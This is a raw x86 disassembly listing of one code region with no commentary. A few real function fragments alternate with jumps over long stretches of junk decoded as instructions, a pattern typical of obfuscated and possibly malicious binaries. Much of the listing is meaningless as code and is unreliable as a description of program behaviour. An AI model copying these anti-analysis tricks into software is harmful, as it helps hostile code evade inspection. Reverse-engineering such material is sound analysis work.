  41e3d3:	jmp    0xbf60cb70
  41e3d8:	pop    eax
  41e3d9:	lods   al,BYTE PTR ds:[esi]
  41e3da:	inc    esi
  41e3db:	sbb    BYTE PTR [edx],bh
  41e3dd:	inc    edi
  41e3de:	dec    ebp
  41e3df:	jecxz  0x41e3fa
  41e3e1:	loope  0x41e462
  41e3e3:	mov    dh,0x40
  41e3e5:	add    edi,DWORD PTR cs:[ebp+0x5fff6f4e]
  41e3ec:	pop    ebx
  41e3ed:	leave  
  41e3ee:	ret    0xc
  41e3f1:	push   ebp
  41e3f2:	mov    ebp,esp
  41e3f4:	jmp    0x41e4c2
  41e3f9:	sar    esp,0x14
  41e3fc:	out    dx,al
  41e3fd:	cmp    eax,0xc2fffbee
  41e402:	adc    bh,BYTE PTR [ebp-0x6b]
  41e405:	retf   0x2b6f
  41e408:	lahf   
  41e409:	push   es
  41e40a:	popa   
  41e40b:	add    DWORD PTR [eax],eax
  41e40d:	mov    cl,0x0
  41e40f:	add    BYTE PTR [eax],al
  41e411:	call   0x453a7438
  41e416:	shl    BYTE PTR [edx+0x5512440],cl
  41e41c:	cmp    BYTE PTR [ecx],ch
  41e41e:	mov    ch,0x40
  41e420:	les    ebx,FWORD PTR [edi-0x7f]
  41e423:	shl    DWORD PTR [eax],cl
  41e425:	fdivr  DWORD PTR [ebp+edx*1+0x7152311b]
  41e42c:	mov    eax,ds:0x65165dc6
  41e431:	jns    0x41e3dd
  41e433:	popa   
  41e434:	push   ecx
  41e435:	sub    DWORD PTR [ebx],ebx
  41e437:	inc    ebp
  41e438:	pusha  
  41e439:	mov    al,ds:0x4c84cc87
  41e43e:	mov    ss,WORD PTR [edi+0x5dbb7027]
  41e444:	adc    eax,0xe78c427a
  41e449:	or     eax,0xf86d2162
  41e44e:	push   es
  41e44f:	imul   esp,DWORD PTR [edi],0xffffff92
  41e452:	dec    eax
  41e453:	sbb    eax,0x707f1617
  41e458:	or     bh,0x65
  41e45b:	call   0x45d3f351
  41e460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e461:	and    ebp,DWORD PTR [ecx+0x7]
  41e464:	mov    bl,BYTE PTR [edx+0x77]
  41e467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e468:	push   ebp
  41e469:	mov    dh,0xa9
  41e46b:	lods   al,BYTE PTR ds:[esi]
  41e46c:	rcl    DWORD PTR [esi-0x68],1
  41e46f:	repz out 0x88,eax
  41e472:	test   WORD PTR es:[ecx+0x4255283f],dx
  41e47a:	xor    edx,edx
  41e47c:	ror    BYTE PTR [edx],0x4f
  41e47f:	inc    esp
  41e480:	inc    ebx
  41e481:	sub    bl,cl
  41e483:	pop    edi
  41e484:	mov    cl,0xe
  41e486:	leave  
  41e487:	cmp    DWORD PTR [edx+0x4d],esi
  41e48a:	dec    ecx
  41e48b:	popa   
  41e48c:	fld    TBYTE PTR [edi]
  41e48e:	enter  0xd314,0xd8
  41e492:	in     eax,dx
  41e493:	enter  0x1789,0x2e
  41e497:	icebp  
  41e498:	ret    
  41e499:	out    0x86,al
  41e49b:	icebp  
  41e49c:	das    
  41e49d:	sub    BYTE PTR [edi],bh
  41e49f:	das    
  41e4a0:	lss    esi,FWORD PTR [edx-0x1eed7592]
  41e4a7:	cmc    
  41e4a8:	mov    bh,0x7
  41e4aa:	cmp    DWORD PTR [edi+edx*8-0x79],0xad749876
  41e4b2:	shl    edi,0xe
  41e4b5:	sbb    DWORD PTR [ebp-0x55a6604a],ebx
  41e4bb:	fmul   DWORD PTR es:[eax-0x256a8859]
  41e4c2:	sub    esp,0x90
  41e4c8:	mov    eax,DWORD PTR [ebp+0x8]
  41e4cb:	movzx  ecx,WORD PTR ds:0x43352c
  41e4d2:	adc    ecx,DWORD PTR ds:0x433598
  41e4d8:	mov    DWORD PTR ds:0x43352c,ecx
  41e4de:	mov    ecx,DWORD PTR [ebp+0xc]
  41e4e1:	sub    DWORD PTR ds:0x433568,0x1e23
  41e4eb:	push   ebx
  41e4ec:	cmp    DWORD PTR ds:0x433648,0x0
  41e4f3:	jg     0x41e51a
  41e4f9:	xor    DWORD PTR ds:0x433648,0x341f
  41e503:	mov    ecx,DWORD PTR ds:0x433600
  41e509:	and    DWORD PTR ds:0x433598,ecx
  41e50f:	jmp    0x41e51a
  41e514:	call   DWORD PTR ds:0x43c7f0
  41e51a:	push   esi
  41e51b:	jmp    0x41e5e9
  41e520:	in     eax,dx
  41e521:	cmp    DWORD PTR [esi+0x1c],0x7e
  41e525:	std    
  41e526:	out    dx,eax
  41e527:	repz cli 
  41e529:	(bad)  [ecx+0x1408f88f]
  41e52f:	fidiv  WORD PTR [edi-0x4efffe9f]
  41e535:	add    BYTE PTR [eax],al
  41e537:	add    BYTE PTR [ebx+0x2c],cl
  41e53a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e53b:	jno    0x41e586
  41e53d:	test   al,0xbe
  41e53f:	jecxz  0x41e547
  41e541:	ret    0x7546
  41e544:	dec    esp
  41e545:	and    DWORD PTR [ebx],ebx
  41e547:	jae    0x41e513
  41e549:	repz fwait
  41e54b:	mov    ecx,0xbe079114
  41e550:	out    0x74,eax
  41e552:	enter  0x9b4c,0x4a
  41e556:	das    
  41e557:	or     eax,0xa7fdfa19
  41e55c:	sbb    DWORD PTR [eax-0x7c],0x7d
  41e560:	pop    ebp
  41e561:	arpl   WORD PTR [ebx],cx
  41e563:	inc    ecx
  41e564:	enter  0xf3af,0x87
  41e568:	lahf   
  41e569:	sti    
  41e56a:	gs or  eax,0xd20e2aee
  41e570:	inc    ebx
  41e571:	adc    ebp,0xc6572560
  41e577:	inc    esp
  41e578:	cwde   
  41e579:	cli    
  41e57a:	dec    ecx
  41e57b:	cs push ebp
  41e57d:	test   eax,edi
  41e57f:	sub    DWORD PTR [esi-0x63f59b1d],eax
  41e585:	das    
  41e586:	add    al,0x9e
  41e588:	mov    dl,0x67
  41e58a:	or     BYTE PTR [ebx+0x2e38440],bl
  41e590:	data16 or al,0xda
  41e593:	cdq    
  41e594:	dec    edx
  41e595:	outs   dx,BYTE PTR ds:[esi]
  41e596:	test   dl,0xc0
  41e599:	push   ebp
  41e59a:	or     cl,BYTE PTR [ebp+0x50ba5c05]
  41e5a0:	add    BYTE PTR [esi+0x3ddfa3f7],bl
  41e5a6:	xchg   edi,eax
  41e5a7:	add    esi,DWORD PTR [ecx+ebp*1]
  41e5aa:	inc    ebp
  41e5ab:	inc    ecx
  41e5ac:	mov    ss,WORD PTR [ebp+0x54ee542c]
  41e5b2:	arpl   WORD PTR [ecx-0x66],bx
  41e5b5:	ret    
  41e5b6:	push   esi
  41e5b7:	cmc    
  41e5b8:	sub    eax,0x4e189845
  41e5bd:	or     ch,BYTE PTR [eax+0x3331bbcf]
  41e5c3:	cld    
  41e5c4:	cmp    edx,esi
  41e5c6:	and    BYTE PTR [edi+0x350ba27],dl
  41e5cc:	xchg   BYTE PTR [edx-0x4e],cl
  41e5cf:	scas   eax,DWORD PTR es:[edi]
  41e5d0:	mov    DWORD PTR [ebx+0x74228826],esp
  41e5d6:	mov    dh,0xad
  41e5d8:	ins    DWORD PTR es:[edi],dx
  41e5d9:	fidivr WORD PTR [edi]
  41e5db:	adc    DWORD PTR [ebx+0x6231235d],esp
  41e5e1:	cs ins BYTE PTR es:[edi],dx
  41e5e3:	test   eax,0x1dcdec64
  41e5e8:	call   0xe98d:0xacd260be
  41e5ef:	leave  
  41e5f0:	add    BYTE PTR [eax],al
  41e5f2:	add    BYTE PTR [ebx-0x413ec5c1],bh
  41e5f8:	(bad)  
  41e5fb:	sar    DWORD PTR [ecx-0x2c1211e],1
  41e601:	dec    esi
  41e602:	mov    gs,WORD PTR [eax+0x62]
  41e605:	add    DWORD PTR [eax],eax
  41e607:	mov    cl,0x0
  41e609:	add    BYTE PTR [eax],al
  41e60b:	jo     0x41e5d7
  41e60d:	adc    ebp,DWORD PTR [edi]
  41e60f:	push   ebp
  41e610:	pop    esp
  41e611:	cli    
  41e612:	or     DWORD PTR [ebx-0x7ad609b9],ecx
  41e618:	lahf   
  41e619:	xchg   ecx,eax
  41e61a:	lods   al,BYTE PTR ds:[esi]
  41e61b:	dec    DWORD PTR [ebx+0x16a4d108]
  41e621:	dec    edi
  41e622:	fiadd  WORD PTR [edi-0x7a18b349]
  41e628:	mov    ds:0x6b999c76,eax
  41e62d:	inc    dl
  41e62f:	jge    0x41e5be
  41e631:	arpl   WORD PTR [edx-0x56dc5f2f],bx
  41e637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e638:	push   esp
  41e639:	pop    ebx
  41e63a:	and    DWORD PTR [ebx],0x8c107e66
  41e640:	imul   esi,esp,0xfffffff0
  41e643:	push   esi
  41e644:	xor    esp,edx
  41e646:	add    DWORD PTR [edi],0xffffffd7
  41e649:	arpl   WORD PTR ds:0x6a0d4941,cx
  41e64f:	mov    ebx,0x86c695fd
  41e654:	xchg   edx,eax
  41e655:	popa   
  41e656:	xchg   DWORD PTR [esi],esp
  41e658:	mov    dh,0x23
  41e65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e65b:	jmp    0xa5a2:0x24b008a9
  41e662:	push   edi
  41e663:	mov    ecx,0xec32c671
  41e668:	jg     0x41e626
  41e66a:	inc    ecx
  41e66b:	dec    ecx
  41e66c:	in     al,dx
  41e66d:	aad    0xc2
  41e66f:	lods   eax,DWORD PTR ds:[esi]
  41e670:	ja     0x41e649
  41e672:	add    eax,esi
  41e674:	retf   
  41e675:	mov    edi,0x331802fe
  41e67a:	std    
  41e67b:	dec    BYTE PTR [eax-0x1]
  41e67e:	ds cld 
  41e680:	pop    edi
  41e681:	jmp    0x41e6cd
  41e683:	invd   
  41e685:	mov    al,0x6c
  41e687:	mov    cl,0x1b
  41e689:	pop    ebx
  41e68a:	sub    ebx,eax
  41e68c:	xchg   esp,eax
  41e68d:	fstp   DWORD PTR [ebp-0x7fe5e7c0]
  41e693:	in     eax,dx
  41e694:	sbb    esi,DWORD PTR [ebx+0x13]
  41e697:	mov    al,0xd3
  41e699:	out    0x32,al
  41e69b:	xchg   ebx,eax
  41e69c:	repz rcr BYTE PTR [ebp+eax*8+0x1b],cl
  41e6a1:	(bad)  
  41e6a2:	call   0x33a8a8ca
  41e6a7:	mov    bh,0xb6
  41e6a9:	mov    ebx,cs
  41e6ab:	aad    0xfc
  41e6ad:	sbb    eax,0xdddaf7aa
  41e6b2:	aad    0xa3
  41e6b4:	stos   BYTE PTR es:[edi],al
  41e6b5:	mov    dl,0x76
  41e6b7:	or     eax,0xec8faea
  41e6bc:	xor    eax,esi
  41e6be:	push   edi
  41e6bf:	mov    edi,0x66479db3
  41e6c4:	and    ebx,0x2284
  41e6ca:	sub    eax,edi
  41e6cc:	not    ebx
  41e6ce:	mov    DWORD PTR [ebp-0x44],eax
  41e6d1:	jmp    0x41e79f
  41e6d6:	ficom  DWORD PTR [edx+0x44]
  41e6d9:	push   0xf2fe7ecc
  41e6de:	add    eax,0x5e9f054f
  41e6e3:	xchg   edx,eax
  41e6e4:	aaa    
  41e6e5:	sbb    DWORD PTR [bp+di+0x1],esp
  41e6e9:	add    BYTE PTR [ecx+0x12000000],dh
  41e6ef:	js     0x41e725
  41e6f1:	xor    DWORD PTR [esi-0x19],ebx
  41e6f4:	test   al,0x21
  41e6f6:	ins    BYTE PTR es:[edi],dx
  41e6f7:	or     ecx,DWORD PTR [ebp+0x42d005d]
  41e6fd:	cmp    eax,0x7bb94d82
  41e702:	cmc    
  41e703:	sar    DWORD PTR [edx],1
  41e705:	mov    dl,cl
  41e707:	mov    al,0xa2
  41e709:	inc    ecx
  41e70a:	sbb    DWORD PTR [eax+0x7],ecx
  41e70d:	cdq    
  41e70e:	sub    eax,0x343ed28e
  41e713:	xchg   BYTE PTR [ebx],bl
  41e715:	mov    dl,0x4b
  41e717:	nop
  41e718:	mov    dl,0xd8
  41e71a:	inc    esp
  41e71b:	sub    DWORD PTR [ecx],edi
  41e71d:	test   DWORD PTR [esi+0x6d],ecx
  41e720:	into   
  41e721:	test   DWORD PTR [ecx+0x57a9c5b6],ebx
  41e727:	or     al,0xd2
  41e729:	sbb    DWORD PTR [ecx+0x22eb28e5],ebx
  41e72f:	in     eax,0x4f
  41e731:	sahf   
  41e732:	scas   eax,DWORD PTR es:[edi]
  41e733:	inc    ebx
  41e734:	xchg   esi,eax
  41e735:	(bad)  
  41e736:	shl    BYTE PTR [esi+0x54],1
  41e739:	pusha  
  41e73a:	retf   
  41e73b:	ret    
  41e73c:	jle    0x41e726
  41e73e:	ret    
  41e73f:	cmp    eax,0x73c4e61c
  41e744:	or     ah,dl
  41e746:	ss pop esp
  41e748:	add    esi,DWORD PTR [esi]
  41e74a:	and    al,0x30
  41e74c:	(bad)  
  41e74e:	lahf   
  41e74f:	mov    ecx,0x2a027c28
  41e754:	jb     0x41e772
  41e756:	xor    ebp,DWORD PTR [eax]
  41e758:	cmp    ecx,DWORD PTR [esi]
  41e75a:	cmp    DWORD PTR [ecx-0x4c9a9dc4],ebp
  41e760:	pop    esi
  41e761:	adc    ch,BYTE PTR [edi+0x1f8bb7e0]
  41e767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e768:	lods   al,BYTE PTR es:[esi]
  41e76a:	add    eax,0xe5415498
  41e76f:	sbb    al,0xaa
  41e771:	adc    DWORD PTR [edi+0x12],ecx
  41e774:	and    al,0x51
  41e776:	and    eax,0x158ad7f0
  41e77b:	sar    BYTE PTR [ebp+0x1],0xa5
  41e77f:	sbb    eax,0xf754ed4a
  41e784:	sbb    edx,ebp
  41e786:	and    DWORD PTR [esi],ecx
  41e788:	lds    edi,FWORD PTR [esi-0x6a3b0bca]
  41e78e:	adc    dh,BYTE PTR [esi+0x5acef52c]
  41e794:	push   edi
  41e795:	dec    ecx
  41e796:	xor    eax,DWORD PTR [edx]
  41e798:	or     al,0xcc
  41e79a:	sbb    BYTE PTR ds:0x8ba2d6a7,dl
  41e7a0:	inc    ebp
  41e7a1:	or     bh,dh
  41e7a3:	fisttp DWORD PTR [ebx+0x25810c4d]
  41e7a9:	ins    BYTE PTR es:[edi],dx
  41e7aa:	xor    eax,0x16400043
  41e7af:	add    BYTE PTR [eax],al
  41e7b1:	xor    eax,esi
  41e7b3:	sub    eax,edi
  41e7b5:	sbb    DWORD PTR ds:0x4335ac,0x202e
  41e7bf:	mov    DWORD PTR [ebp-0x44],eax
  41e7c2:	jmp    0x41e890
  41e7c7:	or     al,BYTE PTR [esi+0x7ade7ad6]
  41e7cd:	scas   al,BYTE PTR es:[edi]
  41e7ce:	idiv   cl
  41e7d0:	push   edx
  41e7d1:	mov    gs,WORD PTR [esi-0x45]
  41e7d4:	loope  0x41e850
  41e7d6:	imul   ecx,edx,0xb1000163
  41e7dc:	add    BYTE PTR [eax],al
  41e7de:	add    cl,ah
  41e7e0:	and    al,0xa9
  41e7e2:	lock nop
  41e7e4:	sbb    DWORD PTR [eax+0x1a],ebp
  41e7e7:	mov    ecx,0xb9762a67
  41e7ec:	and    dl,BYTE PTR [ecx+0x7ea0d0c4]
  41e7f2:	inc    ebp
  41e7f3:	scas   eax,DWORD PTR es:[edi]
  41e7f4:	pusha  
  41e7f5:	mov    ebx,0xfe36d28f
  41e7fa:	jo     0x41e782
  41e7fc:	cmc    
  41e7fd:	push   es
  41e7fe:	fdiv   QWORD PTR ds:0xb2579781
  41e804:	(bad)  
  41e806:	aad    0x8
  41e808:	sbb    eax,0xae21967a
  41e80d:	(bad)  
  41e80e:	and    eax,0xe04a25f7
  41e813:	inc    ebp
  41e814:	adc    DWORD PTR [edi],esi
  41e816:	inc    edi
  41e817:	jle    0x41e7c2
  41e819:	data16 fimul WORD PTR [esi]
  41e81c:	(bad)  [edi-0x23]
  41e81f:	dec    esi
  41e820:	push   ss
  41e821:	pushf  
  41e822:	add    al,0x33
  41e824:	mov    edi,0xe684d486
  41e829:	sub    edx,DWORD PTR [esp+eax*1+0x58bb1a35]
  41e830:	cmc    
  41e831:	scas   eax,DWORD PTR es:[edi]
  41e832:	cmp    DWORD PTR [ecx-0x3a74d230],eax
  41e838:	js     0x41e843
  41e83a:	dec    esp
  41e83b:	aam    0x26
  41e83d:	xor    eax,0xa72173a7
  41e842:	test   eax,0x74fb04d
  41e847:	push   edi
  41e848:	push   ecx
  41e849:	xchg   esp,ebp
  41e84b:	push   esp
  41e84c:	fsubr  DWORD PTR [ecx-0x682cd1f5]
  41e852:	fmul   DWORD PTR [eax-0x6a]
  41e855:	adc    bh,ch
  41e857:	out    dx,al
  41e858:	lods   eax,DWORD PTR ds:[esi]
  41e859:	mov    cl,0x5f
  41e85b:	pop    edi
  41e85c:	sahf   
  41e85d:	icebp  
  41e85e:	mov    ch,0x62
  41e860:	sub    dl,BYTE PTR [edi+0x5a]
  41e863:	mov    dh,ah
  41e865:	xor    al,0x10
  41e867:	in     eax,0x9d
  41e869:	popf   
  41e86a:	in     al,dx
  41e86b:	das    
  41e86c:	jmp    0x7a171284
  41e871:	mov    ch,0x18
  41e873:	or     al,0x5b
  41e875:	outs   dx,DWORD PTR ds:[esi]
  41e876:	pop    esi
  41e877:	hlt    
  41e878:	pop    es
  41e879:	fcom   st(3)
  41e87b:	jo     0x41e889
  41e87d:	sbb    al,0xc8
  41e87f:	enter  0xe932,0xa9
  41e883:	pop    edi
  41e884:	ins    DWORD PTR es:[edi],dx
  41e885:	pop    ebx
  41e886:	(bad)  
  41e887:	jmp    0x41e89a
  41e889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e88a:	lock cmp ah,BYTE PTR [edx-0x5e857576]
  41e891:	xor    al,0x30
  41e893:	inc    ebx
  41e894:	add    BYTE PTR [ebx+0x45894100],cl
  41e89a:	shr    cl,0xc9
  41e89d:	add    BYTE PTR [eax],al
  41e89f:	add    dl,cl
  41e8a1:	and    eax,0xffff74da
  41e8a6:	out    dx,al
  41e8a7:	mov    edi,0x3300143b
  41e8ac:	mov    BYTE PTR [edx+0x4c],0x95
  41e8b0:	jnp    0x41e916
  41e8b2:	add    DWORD PTR [eax],eax
  41e8b4:	mov    cl,0x0
  41e8b6:	add    BYTE PTR [eax],al
  41e8b8:	xor    DWORD PTR [edx],edi
  41e8ba:	sub    DWORD PTR [ecx+0x5e],ebx
  41e8bd:	pop    ds
  41e8be:	in     eax,0x21
  41e8c0:	jle    0x41e8fd
  41e8c2:	(bad)  
  41e8c3:	pop    edi
  41e8c4:	or     al,BYTE PTR [edi]
  41e8c6:	cli    
  41e8c7:	push   ecx
  41e8c8:	cmp    BYTE PTR [esi-0x4e],ch
  41e8cb:	or     BYTE PTR [edx],bh
  41e8cd:	jmp    0x50a68cfe
  41e8d2:	das    
  41e8d3:	sbb    eax,0x7a18fdf3
  41e8d8:	stos   DWORD PTR es:[edi],eax
  41e8d9:	xchg   ecx,eax
  41e8da:	sahf   
  41e8db:	dec    ebx
  41e8dc:	ret    
  41e8dd:	call   0xdfe:0x96317570
  41e8e4:	dec    eax
  41e8e5:	out    0xc0,eax
  41e8e7:	lods   al,BYTE PTR ds:[esi]
  41e8e8:	mov    al,0x86
  41e8ea:	mov    ds:0x7e84aeb,eax
  41e8ef:	(bad)  
  41e8f0:	xchg   ebp,eax
  41e8f1:	jae    0x41e8a6
  41e8f3:	fwait
  41e8f4:	imul   eax,ecx,0x153a630
  41e8fa:	ins    DWORD PTR es:[edi],dx
  41e8fb:	fiadd  DWORD PTR [edi+0x7a]
  41e8fe:	sbb    DWORD PTR [ecx+0x7e],0x67cca46a
  41e905:	test   DWORD PTR [esi],ebx
  41e907:	jp     0x41e8ef
  41e909:	cmc    
  41e90a:	push   0xfffffff0
  41e90c:	cmp    dl,al
  41e90e:	test   ah,bl
  41e910:	(bad)  [ebx+0x79]
  41e913:	repz cmp al,BYTE PTR [edx+0x72]
  41e917:	out    0x6d,eax
  41e919:	fsub   DWORD PTR [di-0x529]
  41e91e:	mov    ebp,0xf0eb7b85
  41e923:	mov    bh,0x68
  41e925:	arpl   WORD PTR [ecx-0x3e],di
  41e928:	jae    0x41e8cd
  41e92a:	imul   ebx,DWORD PTR [ecx+0x4651e420],0xbff5d7df
  41e934:	push   eax
  41e935:	out    0xf7,eax
  41e937:	push   cs
  41e938:	pushf  
  41e939:	mov    eax,ds:0x67a12119
  41e93e:	cmp    al,0x3
  41e940:	cwde   
  41e941:	adc    ecx,DWORD PTR [edx+0x19]
  41e944:	mov    ds,WORD PTR ds:0xc8541cbf
  41e94a:	les    edx,FWORD PTR [edi+0x69]
  41e94d:	je     0x41e8ef
  41e94f:	call   0x2fa02f75
  41e954:	inc    ebp
  41e955:	ss jp  0x41e8d9
  41e958:	xor    bh,dl
  41e95a:	adc    esp,ebx
  41e95c:	sbb    al,0x55
  41e95f:	call   DWORD PTR [ebp+0x56]
  41e962:	sub    cl,dl
  41e964:	loope  0x41e9e1
  41e966:	popf   
  41e967:	mov    edx,0x3244a1d4
  41e96c:	inc    ebx
  41e96d:	add    BYTE PTR [ecx],ah
  41e96f:	or     eax,0x433540
  41e974:	mov    eax,DWORD PTR [eax]
  41e976:	mov    DWORD PTR [ebp-0x3c],eax
  41e979:	mov    eax,DWORD PTR [ebp-0x40]
  41e97c:	adc    ecx,0x2abc
  41e982:	xor    edx,edx
  41e984:	or     DWORD PTR ds:0x433574,0x66aa
  41e98e:	add    eax,edi
  41e990:	jmp    0x41ea5e
  41e995:	and    BYTE PTR [edx+0x6ffe61fc],dh
  41e99b:	mov    ebp,0x248ba9f3
  41e9a0:	imul   esi,DWORD PTR [esi],0x2cbf4e44
  41e9a6:	add    DWORD PTR gs:[eax],eax
  41e9a9:	mov    cl,0x0
  41e9ab:	add    BYTE PTR [eax],al
  41e9ad:	stos   DWORD PTR es:[edi],eax
  41e9ae:	pop    es
  41e9af:	loop   0x41e98a
  41e9b1:	jne    0x41e952
  41e9b3:	xor    BYTE PTR [eax-0x71a3b956],dl
  41e9b9:	sub    al,0x74
  41e9bb:	mov    ch,0xcd
  41e9bd:	push   0xb1f8b39a
  41e9c2:	jno    0x41e9be
  41e9c4:	sbb    al,0xf6
  41e9c6:	adc    esi,ecx
  41e9c8:	mov    bh,0x4a
  41e9ca:	mov    ecx,DWORD PTR [edx+0x3034f642]
  41e9d0:	push   0xffffff92
  41e9d2:	cdq    
  41e9d3:	or     bl,BYTE PTR ds:0xe210c70c
  41e9d9:	pop    eax
  41e9da:	fstp   QWORD PTR [esi]
  41e9dc:	mov    WORD PTR [edi+edx*1],gs
  41e9df:	(bad)  
  41e9e0:	mov    ch,0x9a
  41e9e2:	lock or DWORD PTR [edi-0x13c72b53],0x31
  41e9ea:	adc    eax,0xfc43ec8
  41e9ef:	mov    esi,DWORD PTR [edi]
  41e9f1:	pop    esp
  41e9f2:	cmp    ah,BYTE PTR [ecx-0x27]
  41e9f5:	and    BYTE PTR [edi+0xd],ch
  41e9f8:	cmp    al,0x12
  41e9fa:	shr    DWORD PTR [edi-0x4d2b27bf],0xb6
  41ea01:	pop    ebx
  41ea02:	xlat   BYTE PTR ds:[ebx]
  41ea03:	sub    BYTE PTR [esi-0x7e],ah
  41ea06:	lahf   
  41ea07:	iret   
  41ea08:	sbb    DWORD PTR [ebx+0x70],eax
  41ea0b:	int    0xaf
  41ea0d:	sti    
  41ea0e:	mov    DWORD PTR [ecx-0x21],ecx
  41ea11:	pop    ebp
  41ea12:	fcomp  st(6)
  41ea14:	jmp    0x41ea1e
  41ea16:	cmp    ebx,DWORD PTR [edx+0x7ac03c19]
  41ea1c:	xchg   esi,eax
  41ea1d:	mov    esp,0x1461e71b
  41ea22:	sub    ah,BYTE PTR [ecx+0x6f]
  41ea25:	aas    
  41ea26:	dec    ebx
  41ea27:	xchg   DWORD PTR [edi+0x2042ac4a],ebx
  41ea2d:	or     dh,BYTE PTR [ebx+edi*1-0x1ea08cdb]
  41ea34:	push   ebp
  41ea35:	fwait
  41ea36:	jb     0x41ea69
  41ea38:	test   BYTE PTR [edi-0x6b],al
  41ea3b:	adc    bh,BYTE PTR [edx]
  41ea3d:	push   esp
  41ea3e:	ficomp WORD PTR [ecx+esi*2]
  41ea41:	hlt    
  41ea42:	stos   DWORD PTR es:[edi],eax
  41ea43:	ins    BYTE PTR es:[edi],dx
  41ea44:	ins    BYTE PTR es:[edi],dx
  41ea45:	or     DWORD PTR ds:0x1e58e875,eax
  41ea4b:	xor    al,0x4e
  41ea4d:	dec    esp
  41ea4e:	xor    esp,ecx
  41ea50:	in     al,0xc5
  41ea52:	mov    ds:0xc0beb53,al
  41ea57:	retf   0x6326
  41ea5a:	leave  
  41ea5b:	mov    ds:0xd2810d85,al
  41ea60:	and    esi,DWORD PTR [edx-0x1]
  41ea63:	(bad)  
  41ea64:	mov    ecx,0xacff
  41ea69:	xor    edx,ecx
  41ea6b:	cmp    DWORD PTR ds:0x4335fc,0x0
  41ea72:	jle    0x41ea8c
  41ea78:	or     DWORD PTR ds:0x43362c,edi
  41ea7e:	jmp    0x41ea8c
  41ea83:	push   DWORD PTR [ebp-0x14]
  41ea86:	call   DWORD PTR ds:0x43c814
  41ea8c:	mov    DWORD PTR [ebp-0x24],edx
  41ea8f:	mov    edx,DWORD PTR [ebp+0x8]
  41ea92:	mov    ebx,DWORD PTR [ebp+0xc]
  41ea95:	xor    eax,esi
  41ea97:	jmp    0x41eb65
  41ea9c:	shl    BYTE PTR [eax-0x54],0xf7
  41eaa0:	mov    esp,0x7177dbff
  41eaa5:	sbb    al,0xdd
  41eaa7:	or     eax,0x3986937c
  41eaac:	frstor [ebp+0x1]
  41eaaf:	add    BYTE PTR [ecx+0x7000000],dh
  41eab5:	xor    eax,0x4c879693
  41eaba:	push   es
  41eabb:	aad    0xb2
  41eabd:	jne    0x41ea9d
  41eabf:	pop    esi
  41eac0:	lea    esp,[esp+edi*1+0x5f]
  41eac4:	pop    ds
  41eac5:	jp     0x41eab7
  41eac7:	adc    edi,ebp
  41eac9:	sbb    al,0x7b
  41eacb:	ficom  WORD PTR [ecx+0x67]
  41eace:	retf   
  41eacf:	sub    edx,esi
  41ead1:	sub    al,BYTE PTR [esi]
  41ead3:	fmul   st,st(4)
  41ead5:	jae    0x41ead8
  41ead7:	push   ebp
  41ead8:	iret   
  41ead9:	push   esi
  41eada:	jmp    0x525:0x86b1747b
  41eae1:	jne    0x41eb35
  41eae3:	xor    BYTE PTR [edi+0x70123563],al
  41eae9:	shl    dl,cl
  41eaeb:	fwait
  41eaec:	mov    esi,ebx
  41eaee:	sbb    al,0x2a
  41eaf0:	cmp    al,0x76
  41eaf2:	retf   0xe7cc
  41eaf5:	pop    edi
  41eaf6:	sub    al,0x21
  41eaf8:	cmp    BYTE PTR [esi],dh
  41eafa:	icebp  
  41eafb:	add    BYTE PTR ds:0xfdb34616,dl
  41eb01:	mov    al,0xe4
  41eb03:	sub    eax,0x7cdb9ef8
  41eb08:	dec    ebp
  41eb09:	les    eax,FWORD PTR [edi+0x75846acd]
  41eb0f:	inc    esp
  41eb10:	mov    esp,0x7f0bcec1
  41eb15:	add    cl,cl
  41eb17:	in     al,dx
  41eb18:	xor    esp,0x50
  41eb1b:	jae    0x41eb33
  41eb1d:	arpl   WORD PTR [edx-0x4edcbcd3],bp
  41eb23:	dec    esi
  41eb24:	sahf   
  41eb25:	mov    ds:0x819aec1,al
  41eb2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb2b:	dec    edi
  41eb2c:	mov    eax,0x9fe273c9
  41eb31:	les    eax,FWORD PTR [ebx+0x61f92d8e]
  41eb37:	dec    ebp
  41eb38:	and    eax,0x358f5de3
  41eb3d:	sbb    edi,esp
  41eb3f:	(bad)  
  41eb41:	cli    
  41eb42:	dec    edi
  41eb43:	push   0x33
  41eb45:	in     eax,dx
  41eb46:	test   DWORD PTR [esi],ecx
  41eb48:	cdq    
  41eb49:	push   eax
  41eb4a:	rcr    BYTE PTR [ecx-0x58efb29],0xad
  41eb51:	int    0x84
  41eb53:	pop    es
  41eb54:	test   BYTE PTR [ebx+0x1d53c8e1],cl
  41eb5a:	fld    QWORD PTR [ecx+0x34]
  41eb5d:	or     dh,BYTE PTR [ebx]
  41eb5f:	inc    ebx
  41eb60:	loopne 0x41eb97
  41eb62:	stc    
  41eb63:	popa   
  41eb64:	into   
  41eb65:	mov    DWORD PTR [ebp-0x34],ebx
  41eb68:	mov    DWORD PTR [ebp-0x30],0x4aabda42
  41eb6f:	jmp    0x41ec3d
  41eb74:	enter  0x9a26,0x9a
  41eb78:	(bad)  
  41eb79:	mov    esi,0xf4c576c8
  41eb7e:	out    0x67,al
  41eb80:	push   ss
  41eb81:	pop    es
  41eb82:	xchg   ah,ah
  41eb84:	mov    fs,WORD PTR [esi+0x1]
  41eb87:	add    BYTE PTR [ecx-0x3b000000],dh
  41eb8d:	jmp    0x44105909
  41eb92:	sub    ah,BYTE PTR [ecx-0x57]
  41eb95:	aad    0xa6
  41eb97:	dec    ebp
  41eb98:	int    0x6d
  41eb9a:	sbb    ebp,ecx
  41eb9c:	pop    ebx
  41eb9d:	and    eax,0x521f02d5
  41eba2:	xor    al,0xf2
  41eba4:	xchg   ebx,eax
  41eba5:	outs   dx,BYTE PTR ds:[esi]
  41eba6:	fdivp  st(6),st
  41eba8:	jge    0x41eb72
  41ebaa:	xor    cl,BYTE PTR [ebx-0x18]
  41ebad:	adc    BYTE PTR [eax-0x647df99e],ah
  41ebb3:	jne    0x41eb54
  41ebb5:	inc    ebx
  41ebb6:	out    0x44,eax
  41ebb8:	das    
  41ebb9:	mov    eax,0x22d5b68d
  41ebbe:	add    al,0xca
  41ebc0:	std    
  41ebc1:	(bad)  [edx-0x7999995a]
